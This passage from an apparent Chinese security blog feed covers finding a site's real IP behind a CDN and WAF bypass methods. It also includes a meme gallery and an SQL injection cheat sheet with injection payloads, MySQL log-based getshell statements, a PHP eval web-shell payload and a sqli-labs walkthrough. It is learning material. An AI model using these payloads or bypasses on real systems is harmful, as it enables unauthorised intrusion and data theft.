<h3 id="0x24-SSL证书"><a href="#0x24-SSL证书" class="headerlink" title="0x24 SSL证书"></a>0x24 SSL证书</h3><ol>
<li>在线工具</li>
<li><a href="https://censys.io/" target="_blank" rel="noopener">Censys</a></li>
<li><img src="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/7.png" alt></li>
</ol>
<h3 id="0x25-根据HTTP特定标头查找"><a href="#0x25-根据HTTP特定标头查找" class="headerlink" title="0x25 根据HTTP特定标头查找"></a>0x25 根据HTTP特定标头查找</h3><ol>
<li>有些网站自带或自定义可明显识别的标头</li>
<li><img src="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/3.png" alt></li>
</ol>
<h3 id="0x26-根据网站返回的特定内容查找"><a href="#0x26-根据网站返回的特定内容查找" class="headerlink" title="0x26 根据网站返回的特定内容查找"></a>0x26 根据网站返回的特定内容查找</h3><ol>
<li><img src="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/4.png" alt></li>
</ol>
<h3 id="0x27-国外主机解析（访问）目的网站"><a href="#0x27-国外主机解析（访问）目的网站" class="headerlink" title="0x27 国外主机解析（访问）目的网站"></a>0x27 国外主机解析（访问）目的网站</h3><ol>
<li>国内CDN厂商一般只是针对国内的用户，国外主机访问可能直接访问目的网站的真实ip。</li>
</ol>
<h3 id="0x28-让网站主动找我"><a href="#0x28-让网站主动找我" class="headerlink" title="0x28 让网站主动找我"></a>0x28 让网站主动找我</h3><ol>
<li>RSS邮件订阅（若邮件系统与目的系统是不同服务器，找到的ip可能只是邮件系统的服务器），很多网站有邮件系统，甚至在内部网段，没有经过CDN的解析，通过查看邮件原文，来查看ip：</li>
<li><img src="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/5.png" alt></li>
<li><img src="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/6.png" alt></li>
<li>还有注册、密码找回、修改密码等等</li>
</ol>
<h3 id="0x29-利用网站漏洞来查找"><a href="#0x29-利用网站漏洞来查找" class="headerlink" title="0x29 利用网站漏洞来查找"></a>0x29 利用网站漏洞来查找</h3><ol>
<li>命令执行反弹shell</li>
<li>敏感文件泄露（phpinfo泄露、github信息泄露、配置文件可访问等等）</li>
<li>phpinfo搜索addr</li>
<li><img src="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/8.png" alt></li>
<li>XSS盲打</li>
<li>文件上传</li>
<li>SSRF</li>
</ol>
<h3 id="0x2A-社工"><a href="#0x2A-社工" class="headerlink" title="0x2A 社工"></a>0x2A 社工</h3><ol>
<li>问</li>
<li>猜</li>
<li>搜集</li>
<li><strong>常识判断</strong></li>
<li>反查ip，有很多不同的域名，那绝大多数不是真实ip。<a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">在线反查ip</a></li>
<li>asp/aspx网站的http响应头server字段的值不是IIS，而是nginx，那就是使用了nginx反向代理。</li>
<li>ping出来的ip定位到CDN服务商上，那绝大多数不是真实ip。</li>
<li>拿下CDN服务器后台</li>
</ol>
<h3 id="0x2B-zenmap全网扫"><a href="#0x2B-zenmap全网扫" class="headerlink" title="0x2B zenmap全网扫"></a>0x2B zenmap全网扫</h3><ol>
<li>匹配banner扫描全网</li>
</ol>
<h3 id="0x2C-F5-LTM解码法"><a href="#0x2C-F5-LTM解码法" class="headerlink" title="0x2C F5 LTM解码法"></a>0x2C F5 LTM解码法</h3><ol>
<li>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></li>
</ol>
]]></content>
      <tags>
        <tag>信息搜集</tag>
        <tag>CDN</tag>
      </tags>
  </entry>
  <entry>
    <title>绕WAF基础</title>
    <url>/%E7%BB%95WAF%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="0x00-WAF-amp-amp-CDN"><a href="#0x00-WAF-amp-amp-CDN" class="headerlink" title="0x00 WAF &amp;&amp; CDN"></a>0x00 WAF &amp;&amp; CDN</h2><p><img src="/%E7%BB%95WAF%E5%9F%BA%E7%A1%80/1.png" alt></p>
<ol>
<li>WAF（Web Application Firewall）：Web应用防火墙。</li>
<li>WAF是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</li>
<li>CDN（Content Delivery Network）：内容分发网络。</li>
<li>CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</li>
<li>WAF有三种：云WAF、硬WAF、软WAF。</li>
<li>云WAF：百度云加速、阿里云云盾等，部署简单，维护成本低，可当CDN，但存在被绕过。</li>
<li>硬WAF：nsfocus、imperva等，串行部署在web服务器前端，检测、拦截异常流量，即插即用，防护范围大，但成本高</li>
<li>软WAF：安全狗、D盾等，安装在需防护的服务器上，监听端口，检测或拦截外来的非法请求，免费且管理方便，但易误杀，占用内存多。</li>
</ol>
<h2 id="0x01-主流WAF"><a href="#0x01-主流WAF" class="headerlink" title="0x01 主流WAF"></a>0x01 主流WAF</h2><p><strong>云WAF</strong></p>
<ol>
<li>阿里云盾</li>
<li>腾讯网站管家</li>
<li>创宇盾</li>
<li>cloudflare</li>
</ol>
<p><strong>软件WAF</strong></p>
<ol>
<li>安全狗</li>
<li>云锁</li>
<li>360主机卫士</li>
<li>Modsecurity</li>
</ol>
<p><strong>硬件WAF</strong></p>
<ol>
<li>启明星辰</li>
<li>绿盟</li>
<li>天融信</li>
<li>飞塔</li>
</ol>
<h2 id="0x02-绕WAF"><a href="#0x02-绕WAF" class="headerlink" title="0x02 绕WAF"></a>0x02 绕WAF</h2><ol>
<li>从架构层绕WAF</li>
<li>从匹配资源大小限制绕WAF</li>
<li>从协议层绕WAF</li>
<li>从规则层绕WAF</li>
</ol>
<h2 id="0x03-从架构层绕WAF"><a href="#0x03-从架构层绕WAF" class="headerlink" title="0x03 从架构层绕WAF"></a>0x03 从架构层绕WAF</h2><ol>
<li>原理：云WAF、CDN等，通过更改DNS解析，将流量流过WAF区，检测后判定为非攻击流量再转发到目的网站。</li>
<li>所以，这里绕WAF就是，找到目的网站的真实IP：<a href="https://10fteam.github.io/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/">https://10fteam.github.io/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/</a></li>
<li>利用同网段的其他服务器来绕过，例如：VPS，自己买的VPS与目的网站是同个云厂商，所以VPS相当于在局域网，可能不经过WAF，实际看云厂商的网络配置。（SSRF）</li>
</ol>
<h2 id="0x04-从匹配资源大小限制绕WAF"><a href="#0x04-从匹配资源大小限制绕WAF" class="headerlink" title="0x04 从匹配资源大小限制绕WAF"></a>0x04 从匹配资源大小限制绕WAF</h2><ol>
<li>DOS/CC</li>
<li>过多的HTTP请求耗尽WAF的处理能力，然后流量可能就直接到目的网站。</li>
<li>过大的HTTP请求POST内容来消耗WAF的内容检查的CPU资源、内存资源等等，如果WAF只处理前面的几K、几M内容，那payload放在后面，未被检测而到达目的网站。</li>
</ol>
<h2 id="0x05-从协议层绕WAF"><a href="#0x05-从协议层绕WAF" class="headerlink" title="0x05 从协议层绕WAF"></a>0x05 从协议层绕WAF</h2><ol>
<li>有的CDN只针对HTTP/HTTPS协议，其他协议却不作处理就放行。</li>
<li>原因：1.协议覆盖不全，2.协议解析不一致，3.协议解析与web容器的协议解析不一致</li>
<li><strong>协议覆盖不全</strong></li>
<li>例子：POST请求常用的两种内容类型：</li>
<li>Content-Type: application/x-www-form-urlencoded;</li>
<li>Content-Type: multipart/form-data;</li>
<li>WAF未能覆盖某一个导致被绕过，或者WAF认为是文件上传请求而只检测文件上传导致被绕过。</li>
<li><strong>协议解析不一致</strong></li>
<li>例子：文件上传，文件名为1.jpg0x0a1.php，0x0a是\n，换行的意思，WAF解析为jpg文件，php解析为php文件，所以存在被绕过。(还有多行文件名等绕过)</li>
</ol>
<h2 id="0x06-从规则层绕WAF"><a href="#0x06-从规则层绕WAF" class="headerlink" title="0x06 从规则层绕WAF"></a>0x06 从规则层绕WAF</h2><ol>
<li>注释符绕过</li>
<li>空白符绕过</li>
<li>函数替换拆分绕过</li>
<li>大小写绕过</li>
<li>编码解码绕过</li>
<li>特定函数绕过</li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></li>
</ol>
]]></content>
      <tags>
        <tag>知识</tag>
        <tag>WAF</tag>
      </tags>
  </entry>
  <entry>
    <title>图文并茂</title>
    <url>/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/</url>
    <content><![CDATA[<h2 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h2><ol>
<li>不要在一棵树上吊死，要多在几棵树上试试~</li>
<li>忍一时越想越气，退一步越觉越亏。</li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/1.gif" alt></li>
<li>绝世好剑</li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/2.jpg" alt></li>
<li>你！</li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/3.jpg" alt></li>
<li>坚持~</li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/4.jpg" alt></li>
<li>有点*疼~</li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/5.gif" alt></li>
<li>吸到怀疑蚊生</li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/6.gif" alt></li>
<li>咬我啊</li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/2.gif" alt></li>
<li>无中生友</li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/3.gif" alt></li>
<li>切屏无敌</li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/4.gif" alt></li>
<li>支管婴儿</li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/5.jpg" alt></li>
<li>生无可恋</li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/7.gif" alt></li>
<li>冒泡</li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/8.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/9.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/10.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/11.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/12.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/6.jpg" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/7.jpg" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/8.jpg" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/9.jpg" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/18.jpg" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/19.jpg" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/10.jpg" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/13.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/14.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/15.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/16.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/17.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/18.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/19.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/20.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/21.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/22.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/23.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/24.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/25.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/26.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/27.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/28.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/29.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/30.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/31.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/32.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/33.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/34.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/35.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/36.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/37.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/38.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/39.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/40.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/41.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/42.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/43.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/44.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/45.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/46.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/47.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/48.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/49.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/50.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/51.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/52.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/53.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/54.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/55.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/56.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/57.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/58.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/59.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/60.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/61.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/62.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/63.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/64.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/65.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/66.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/67.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/68.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/69.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/70.gif" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/71.gif" alt></li>
</ol>
<h2 id="1920-1080壁纸"><a href="#1920-1080壁纸" class="headerlink" title="1920*1080壁纸"></a>1920*1080壁纸</h2><ol>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/1.png" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/1.jpeg" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/2.png" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/11.jpg" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/12.jpg" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/13.jpg" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/14.jpg" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/15.jpg" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/16.jpg" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/17.jpg" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/3.png" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/4.png" alt></li>
<li><img src="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/5.png" alt></li>
</ol>
]]></content>
      <tags>
        <tag>share</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="0x00-SQL注入"><a href="#0x00-SQL注入" class="headerlink" title="0x00 SQL注入"></a>0x00 SQL注入</h2><p><img src="/SQL%E6%B3%A8%E5%85%A5/1.jfif" alt></p>
<h2 id="0x10-mysql"><a href="#0x10-mysql" class="headerlink" title="0x10 mysql"></a>0x10 mysql</h2><h3 id="0x11-常用闭合语句"><a href="#0x11-常用闭合语句" class="headerlink" title="0x11 常用闭合语句"></a>0x11 常用闭合语句</h3><ol>
<li>‘ and true–</li>
<li>“ and “a”=”a</li>
<li>‘) and (‘’)=(‘</li>
<li>“) and (“1”)=(“1</li>
<li>‘)) and ((‘’))=((‘</li>
<li>‘ and ‘’=’</li>
<li>‘ or ‘’=’</li>
<li>‘ or ‘’-‘</li>
<li>‘ or ‘’&amp;’</li>
<li>‘ or ‘’ ‘</li>
<li>‘ or ‘’^’</li>
<li>‘ or ‘’*’</li>
<li>‘ or ‘’+’</li>
<li>‘ order by 10–</li>
<li>‘ and 3-2%23</li>
<li>‘ or sleep(10)#</li>
</ol>
<h3 id="0x12-常用注释"><a href="#0x12-常用注释" class="headerlink" title="0x12 常用注释"></a>0x12 常用注释</h3><ol>
<li>–</li>
<li>–+</li>
<li>#</li>
<li>%23</li>
</ol>
<h3 id="0x13-sql常用语句"><a href="#0x13-sql常用语句" class="headerlink" title="0x13 sql常用语句"></a>0x13 sql常用语句</h3><ol>
<li>union select</li>
<li>order by</li>
<li>like</li>
<li>sleep</li>
<li>unhex(hex(@@version))</li>
</ol>
<h3 id="0x14-获取信息函数"><a href="#0x14-获取信息函数" class="headerlink" title="0x14 获取信息函数"></a>0x14 获取信息函数</h3><ol>
<li>user()    #用户名</li>
<li>version()    #版本</li>
<li>@@version     #版本</li>
<li>database()    #数据库名</li>
<li>@@datadir    #数据库路径</li>
<li>@@version_compile_os #操作系统版本</li>
<li><strong>mysql 5.0以上</strong></li>
<li>information_schema.schemata</li>
<li>information_schema.tables</li>
<li>information_schema.columns</li>
<li><strong>mysql 5.0以下</strong></li>
<li>‘ union select 1,2 from user; #手工爆破table</li>
</ol>
<h3 id="0x15-逻辑判断函数"><a href="#0x15-逻辑判断函数" class="headerlink" title="0x15 逻辑判断函数"></a>0x15 逻辑判断函数</h3><ol>
<li>concat() #没有分隔符地连接字符串</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/15.png" alt></li>
<li>concat_ws() #含有分隔符地连接字符串</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/16.png" alt></li>
<li>group_concat() #连接一个组的所有字符串，并以逗号分隔每一条数据 </li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/17.png" alt></li>
<li>left(database(),1)=’5’ #从左到右截取几位</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/14.png" alt></li>
</ol>
<h3 id="0x16-load-file-与into-outfile"><a href="#0x16-load-file-与into-outfile" class="headerlink" title="0x16 load_file()与into outfile()"></a>0x16 load_file()与into outfile()</h3><ol>
<li><strong>mysql新特性secure_file_priv对读写文件的影响</strong></li>
<li>secure_file_priv参数用来限制load data、select…loadfile、select…outfile，加载数据，上传下载文件的</li>
<li>show variables like “%secure%”;  #查询</li>
<li>show global variables like ‘%secure%’;  #查询</li>
<li><strong>值为NULL：表示不允许导入或导出</strong></li>
<li><strong>值为/tmp/：限制导入或导出只能在/tmp/目录下</strong></li>
<li><strong>无值，就不限制导入或导出</strong></li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/18.png" alt></li>
<li><strong>设置</strong></li>
<li>windows下，my.ini里的[mysqld]后添加（默认无，有就修改，=值为NULL、/(dir)、空白）：secure_file_priv= </li>
<li>Linux下，my.cnf里的[mysqld]后添加：secure_file_priv= </li>
<li>最后重启mysql</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/19.png" alt></li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/20.png" alt></li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/21.png" alt></li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/22.png" alt></li>
<li><strong>load_file()</strong></li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/24.png" alt></li>
<li><strong>into outfile()</strong></li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/23.png" alt></li>
<li><strong>全局日志getshell：利用全局变量general_log</strong></li>
<li>show variables like “%general%”; #查询</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/25.png" alt></li>
<li>set global general_log=on;set global general_log_file=’C:/phpStudy/WWW/1.php’;select ‘<?php phpinfo();?>‘; #修改配置</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/26.png" alt></li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/27.png" alt></li>
<li><strong>慢查询日志getshell</strong></li>
<li>show variables like ‘%slow%’; #查询</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/28.png" alt></li>
<li>set GLOBAL slow_query_log=on;set GLOBAL log_queries_not_using_indexes=on;set GLOBAL slow_query_log_file=’C:/phpStudy/WWW/slow.php’;</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/29.png" alt></li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/30.png" alt></li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/31.png" alt></li>
<li><strong>错误日志getshell</strong></li>
<li></li>
<li><strong>phpmyadmin4.8.x本地文件包含漏洞getshell</strong></li>
<li></li>
<li><strong>注意：</strong></li>
<li>路径使用/或\</li>
<li>盘符下可使用c:1.php</li>
<li>c:1.php可使用16进制代替（0x633A312E706870）</li>
</ol>
<h3 id="0x17-SQL注入与RFI"><a href="#0x17-SQL注入与RFI" class="headerlink" title="0x17 SQL注入与RFI"></a>0x17 SQL注入与RFI</h3><ol>
<li>‘+union+select+’<?php eval($_request[cmd]);?>‘&amp;cmd=passthru(‘ls’);</li>
</ol>
<h3 id="0x18-报错注入"><a href="#0x18-报错注入" class="headerlink" title="0x18 报错注入"></a>0x18 报错注入</h3><ol>
<li><a href="http://192.168.100.3/sqli-labs/Less-1/?id=1" target="_blank" rel="noopener">http://192.168.100.3/sqli-labs/Less-1/?id=1</a> #正常访问</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/1.png" alt></li>
<li><a href="http://192.168.100.3/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.100.3/sqli-labs/Less-1/?id=1&#39;</a> #简单测试</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/2.png" alt></li>
<li><a href="http://192.168.100.3/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.100.3/sqli-labs/Less-1/?id=1&#39;</a> and 1=1%23 #闭合测试</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/3.png" alt></li>
<li><a href="http://192.168.100.3/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.100.3/sqli-labs/Less-1/?id=1&#39;</a> and 1=11%23 #闭合测试</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/4.png" alt></li>
<li><a href="http://192.168.100.3/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.100.3/sqli-labs/Less-1/?id=1&#39;</a> order by 10%23 #列数量判断</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/5.png" alt></li>
<li><a href="http://192.168.100.3/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.100.3/sqli-labs/Less-1/?id=1&#39;</a> order by 4%23</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/6.png" alt></li>
<li><a href="http://192.168.100.3/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.100.3/sqli-labs/Less-1/?id=1&#39;</a> order by 3%23</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/7.png" alt></li>
<li>实际就3列</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/8.png" alt></li>
<li><a href="http://192.168.100.3/sqli-labs/Less-1/?id=&#39;" target="_blank" rel="noopener">http://192.168.100.3/sqli-labs/Less-1/?id=&#39;</a> union select 1,2,3%23 #报错显示所在列</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/9.png" alt></li>
<li><a href="http://192.168.100.3/sqli-labs/Less-1/?id=&#39;" target="_blank" rel="noopener">http://192.168.100.3/sqli-labs/Less-1/?id=&#39;</a> union select 1,group_concat(schema_name),3 from information_schema.schemata%23 #列出所有表名，mysql5.0以上</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/10.png" alt></li>
<li><a href="http://192.168.100.3/sqli-labs/Less-1/?id=&#39;" target="_blank" rel="noopener">http://192.168.100.3/sqli-labs/Less-1/?id=&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’%23 #或者</li>
<li><a href="http://192.168.100.3/sqli-labs/Less-1/?id=&#39;" target="_blank" rel="noopener">http://192.168.100.3/sqli-labs/Less-1/?id=&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479%23</li>
<li><img src="/SQL%E6%B3%A8%E5%85%A5/11.png" alt></li>
<li><a href="http://192.168.100.3/sqli-labs/Less-1/?id=&#39;" target="_blank" rel="noopener">http://192.168.100.3/sqli-labs/Less-1/?id=&#39;</a> union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’%23</li>
